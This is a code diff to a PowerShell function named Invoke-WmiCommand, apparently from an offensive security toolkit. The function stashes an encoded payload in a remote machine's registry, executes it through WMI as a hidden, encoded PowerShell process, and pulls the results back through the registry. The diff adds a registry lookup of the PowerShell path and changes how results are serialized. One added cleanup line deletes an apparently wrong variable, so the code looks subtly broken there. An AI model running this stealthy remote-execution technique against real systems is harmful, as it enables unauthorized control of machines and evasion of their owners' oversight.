@@ -1,5 +1,3 @@
-#Requires -Version 2
-
 function Invoke-WmiCommand {
 <#
 .SYNOPSIS
@@ -185,7 +183,7 @@ the output of your payload back. :P
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $Credential,
+        $Credential = [Management.Automation.PSCredential]::Empty,
 
         [Management.ImpersonationLevel]
         $Impersonation,
@@ -208,6 +206,8 @@ the output of your payload back. :P
             'HKEY_USERS' { $Hive = 2147483651 }
             'HKEY_CURRENT_CONFIG' { $Hive = 2147483653 }
         }
+
+        $HKEY_LOCAL_MACHINE = 2147483650
 
         $WmiMethodArgs = @{}
 
@@ -253,6 +253,18 @@ the output of your payload back. :P
                 throw "[$Computer] You do not have permission to perform all the registry operations necessary for Invoke-WmiCommand."
             }
 
+            $PSSettingsPath = 'SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell'
+            $PSPathValueName = 'Path'
+
+            $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $HKEY_LOCAL_MACHINE, $PSSettingsPath, $PSPathValueName
+
+            if ($Result.ReturnValue -ne 0) {
+                throw "[$Computer] Unable to obtain powershell.exe path from the following registry value: HKEY_LOCAL_MACHINE\$PSSettingsPath\$PSPathValueName"
+            }
+
+            $PowerShellPath = $Result.sValue
+            Write-Verbose "[$Computer] Full PowerShell path: $PowerShellPath"
+
             $EncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Payload))
 
             Write-Verbose "[$Computer] Storing the payload into the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
@@ -282,18 +294,25 @@ the output of your payload back. :P
                 if (($Result.ReturnValue -eq 0) -and ($Result.sValue)) {
                     $Payload = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Result.sValue))
 
-                    $SerilizedPayloadResult = Invoke-Expression ($Payload) | % {
-                        [Management.Automation.PSSerializer]::Serialize($_, 4)
-                    }
+                    $TempSerializedResultPath = [IO.Path]::GetTempFileName()
 
-                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'SetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $SerilizedPayloadResult, $RegistryResultValueName
+                    $PayloadResult = Invoke-Expression ($Payload)
+
+                    Export-Clixml -InputObject $PayloadResult -Path $TempSerializedResultPath
+
+                    $SerilizedPayloadText = [IO.File]::ReadAllText($TempSerializedResultPath)
+
+                    $null = Invoke-WmiMethod @WmiMethodArgs -Name 'SetStringValue' -ArgumentList $Hive, $RegistryKeyPath, $SerilizedPayloadText, $RegistryResultValueName
+
+                    Remove-Item -Path $SerilizedPayloadResult -Force
+
                     $null = Invoke-WmiMethod @WmiMethodArgs -Name 'DeleteValue' -ArgumentList $Hive, $RegistryKeyPath, $RegistryPayloadValueName
                 }
             }
 
             $Base64Payload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($RemotePayloadRunner))
 
-            $Cmdline = "powershell -WindowStyle Hidden -NoProfile -EncodedCommand $Base64Payload"
+            $Cmdline = "$PowerShellPath -WindowStyle Hidden -NoProfile -EncodedCommand $Base64Payload"
 
             # Execute the payload runner on the remote system
             $Result = Invoke-WmiMethod @WmiMethodArgs -Namespace 'Root\cimv2' -Class 'Win32_Process' -Name 'Create' -ArgumentList $Cmdline
@@ -301,7 +320,7 @@ the output of your payload back. :P
             Start-Sleep -Seconds 5
 
             if ($Result.ReturnValue -ne 0) {
-                throw "[$Computer] Unable execute payload stored within the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
+                throw "[$Computer] Unable to execute payload stored within the following registry value: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
             }
 
             Write-Verbose "[$Computer] Payload successfully executed from: $RegistryHive\$RegistryKeyPath\$RegistryPayloadValueName"
@@ -315,7 +334,13 @@ the output of your payload back. :P
             Write-Verbose "[$Computer] Payload results successfully retrieved from: $RegistryHive\$RegistryKeyPath\$RegistryResultValueName"
 
             $SerilizedPayloadResult = $Result.sValue
-            $PayloadResult = [Management.Automation.PSSerializer]::Deserialize($SerilizedPayloadResult)
+
+            $TempSerializedResultPath = [IO.Path]::GetTempFileName()
+
+            Out-File -InputObject $SerilizedPayloadResult -FilePath $TempSerializedResultPath
+            $PayloadResult = Import-Clixml -Path $TempSerializedResultPath
+
+            Remove-Item -Path $TempSerializedResultPath
 
             $FinalResult = New-Object PSObject -Property @{
                 PSComputerName = $Computer
